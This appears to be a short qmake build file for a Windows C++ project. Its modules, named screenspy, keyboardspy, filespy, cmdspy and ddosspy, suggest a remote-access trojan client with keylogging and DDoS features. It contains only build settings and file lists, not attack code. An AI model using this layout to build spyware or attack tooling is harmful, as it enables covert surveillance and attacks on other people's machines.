SOURCES += \
    main.cpp \
    tcpsocket.cpp \
    zeroclient.cpp \
    screenspy.cpp \
    keyboardspy.cpp \
    filespy.cpp \
    cmdspy.cpp \
    ddosspy.cpp

DEFINES -= UNICODE

LIBS += -lws2_32 -lgdi32 $${PWD}\jpeg\libjpeg.lib

HEADERS += \
    tcpsocket.h \
    zeroclient.h \
    screenspy.h \
    keyboardspy.h \
    filespy.h \
    cmdspy.h \
    ddosspy.h
